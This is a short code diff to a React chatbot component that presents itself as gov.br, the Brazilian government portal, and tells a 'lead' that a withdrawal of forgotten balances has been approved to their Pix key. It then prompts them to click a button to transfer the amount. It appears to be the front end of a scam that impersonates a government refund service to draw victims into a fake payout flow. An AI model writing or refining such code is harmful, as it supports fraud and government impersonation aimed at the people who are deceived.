@@ -284,7 +284,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         if (ttsRes.data.audioBase64) {
           const finalAudioUrl = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
           setTimeout(() => {
-            addBotMessage("", undefined, undefined, "audio", finalAudioUrl);
+            addBotMessage("", undefined, undefined, undefined, finalAudioUrl);
           }, 2000);
         }
       }).catch(err => console.error("Final TTS error", err));
@@ -370,7 +370,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, `/assets/banners/banner_atencao.png?v=${Date.now()}`, undefined, localAudioUrl);
+            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada para a Chave Pix cadastrada:\nChave Pix: **${data.docValue}**\n\nClique no botão abaixo para efetuar a transferência do valor de **${leadValue}** para a conta da Chave Pix cadastrada.`, undefined, undefined, undefined, localAudioUrl);
             
             setTimeout(() => {
               setTyping(true);
@@ -527,7 +527,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
             >
               {msg.sender === 'bot' && (
                 <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
-                  <img src={`/assets/banners/bot_avatar.png?v=${Date.now()}`} alt="gov.br" className="w-full h-full object-cover rounded-full" />
+                  <img src={`/assets/banners/bot_avatar.png?v=${Date.now()}`} alt="gov.br" className="w-full h-full object-contain rounded-full" />
                 </div>
               )}
 
